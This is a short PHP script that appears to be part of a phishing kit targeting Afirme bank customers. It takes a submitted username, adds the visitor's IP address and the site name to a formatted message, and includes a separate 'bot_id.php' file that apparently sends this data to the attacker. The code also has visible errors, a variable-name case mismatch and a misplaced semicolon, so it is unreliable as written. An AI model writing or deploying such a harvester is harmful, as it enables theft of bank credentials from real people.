<?php  


	$usu=$_POST['usu'];
  


	$Enviara ="➖➖➖➖[ AFIRME ]➖➖➖➖\n".
  "<b>✔️USER: </b>  <code>".$usu."</code>\n".
  
  

  "🌐 IP ".$_SERVER['REMOTE_ADDR']."\n";
  "🌐WEBSITE:".$_SERVER['SERVER_NAME']."\n".
  $enviar =  urldecode($enviara);
  include 'bot_id.php';
?>
